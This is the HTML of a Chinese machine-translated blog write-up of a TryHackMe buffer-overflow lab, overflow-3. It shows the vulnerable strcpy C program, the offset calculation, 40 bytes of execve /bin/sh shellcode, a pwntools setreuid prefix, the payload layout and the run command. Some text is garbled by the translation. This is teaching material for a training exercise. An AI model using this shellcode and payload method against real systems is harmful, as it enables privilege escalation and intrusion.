href="https://tryhackme.com/room/bof1" rel="noopener ugc nofollow" target="_blank">缓冲区溢出</a>"进行同样的测试。看看overflow-3文件夹。</p></blockquote><h1 id="3751" class="la lb iq bd lc ld le lf lg lh li lj lk ll ot ln lo lp ou lr ls lt ov lv lw lx bi translated">挑战是什么？？</h1><blockquote class="md me mf"><p id="0d3a" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">打开一个shell并阅读secret.txt文件的内容</p></blockquote><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ow"><img src="../Images/c35a13f9696cffb9e20817aaf7f10bc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZuiOh4Aap4kpUhVj5XLVnQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">拒绝许可！！</figcaption></figure><p id="1b5f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在这个文件夹中，你会发现下面的C代码。</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="2d04" class="mt lb iq mp b gy mu mv l mw mx">//* buffer-overflow.c *//</span><span id="5fae" class="mt lb iq mp b gy my mv l mw mx">#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;</span><span id="c9a5" class="mt lb iq mp b gy my mv l mw mx">void copy_arg(char *string)<br/>{<br/>    char buffer[140];<br/>    strcpy(buffer, string);<br/>    printf("%s\n", buffer);<br/>    return 0;<br/>}</span><span id="3d9c" class="mt lb iq mp b gy my mv l mw mx">int main(int argc, char **argv)<br/>{<br/>    printf("Here's a program that echo's out your input\n");<br/>    copy_arg(argv[1]);<br/>}</span></pre><p id="dd76" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">argv[1]，它是一个长度为140字节的缓冲区的命令行参数。由于strcpy的性质，它不检查数据的长度。所以我们要变些魔术！</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/8d97369153987bcdbde46506798fdf0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XvFoDyjfuVD-aYQEankUVg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">分段故障</figcaption></figure><blockquote class="mz"><p id="0f23" class="na nb iq bd nc nd ne nf ng nh ni kz dk translated">4字节被覆盖。(0x0000000041414141) <br/>偏移量为(156–4)152字节。</p></blockquote><p id="d85c" class="pw-post-body-paragraph kc kd iq ke b kf nj kh ki kj nk kl km kn nl kp kq kr nm kt ku kv nn kx ky kz ij bi translated">几次尝试都以“非法指令”错误失败后，我找到了一个外壳代码(40字节)。</p><p id="49c7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">shell code = ' \ x6a \ x3b \ x58 \ x48 \ x31 \ xd2 \ x49 \ xb8 \ x2f \ x2f \ x62 \ x69 \ x6e \ x2f \ x73 \ x68 \ x49 \ xc1 \ xe8 \ x08 \ x41 \ x50 \ x48 \ x89 \ xe7 \ x52 \ x57 \ x48 \ x89 \ xe6 \ x0f \ x05 \ x6a \ x3c \ x58 \ x48 \ x31 \ xff \ x05 '</p><p id="efea" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">卡特彼勒/etc/passwd </strong></p><p id="330b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">包含以下信息的冒号分隔文件:用户名、加密密码、用户ID号(UID)、用户组ID号(GID)。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/1bd9f8f9e5e0a1bd6b40e8b5dfcd53f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AzgMDocijYYuEoq5V_bKyA.png"/></div></div></figure><p id="1476" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以使用pwntools为shell代码生成一个前缀来运行SETREUID</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="ec46" class="mt lb iq mp b gy mu mv l mw mx"><strong class="mp ir">setreuid</strong>() sets real and effective user IDs of the calling process.</span></pre><blockquote class="md me mf"><p id="bbc1" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">(1002:用户2)</p><p id="0034" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated"><em class="iq">pwn shell craft-f d amd64 . Linux . setre uid 1002</em></p><p id="48c9" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated"><strong class="ke ir">我们的有效载荷长度</strong></p><p id="945d" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">NOP sled = 90<br/>setre uid = 14<br/>Shellcode = 40<br/>Random chars = 8<br/>内存地址= 6</p><p id="9983" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi">90 + 14 + 40 + 8 + 6 = 158</p></blockquote><blockquote class="mz"><p id="e97b" class="na nb iq bd nc nd ne nf ng nh ni kz dk translated"><strong class="ak">利用</strong></p></blockquote><p id="eeed" class="pw-post-body-paragraph kc kd iq ke b kf nj kh ki kj nk kl km kn nl kp kq kr nm kt ku kv nn kx ky kz ij bi translated">用python写漏洞利用超级容易。我的漏洞如下所示。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/d1fadfabcee4ff595d936ef523fcf2cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wSLmuEEIw_BPm7N0dA94yg.png"/></div></div></figure><p id="0cdb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们运行漏洞→。/buffer-overflow $(python exploit . py；猫)</p><blockquote class="mz"><p id="c217" class="na nb iq bd nc nd nq nr ns nt nu kz dk translated">嘣！成功开发</p></blockquote><figure class="nv nw nx ny nz jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ox"><img src="../Images/9ad5883fa0107b52721a7810e6d2663d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UbeiGdbi8XKm2XB_F4_A8A.png"/></div></div></figure><h1 id="1149" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">—注意—</h1><p id="778a" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">这只是一个开始..！将来，我们会讨论游戏的下一关😎！！</p></div><div class="ab cl oy oz hu pa" role="separator"><span class="pb bw bk pc pd pe"/><span class="pb bw bk pc pd pe"/><span class="pb bw bk pc pd"/></div><div class="ij ik il im in"><blockquote class="mz"><p id="72d7" class="na nb iq bd nc nd nq nr ns nt nu kz dk translated">🔹社交网络→联系我！🥰</p></blockquote><p id="96c4" class="pw-post-body-paragraph kc kd iq ke b kf nj kh ki kj nk kl km kn nl kp kq kr nm kt ku kv nn kx ky kz ij bi translated"><strong class="ke ir"> <em class="mg">随时在推特上连接</em> </strong> <a class="ae os" href="https://twitter.com/7h3h4ckv157" rel="noopener ugc nofollow" target="_blank"> @7h3h4ckv157 </a></p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/d5f8216cc37898466f5a951e901d2389.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/1*tTg7xOmAfRU_nEPlVxkJnQ.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">感谢您的阅读..！！😉</figcaption></figure></div></div>    
</body>
</html>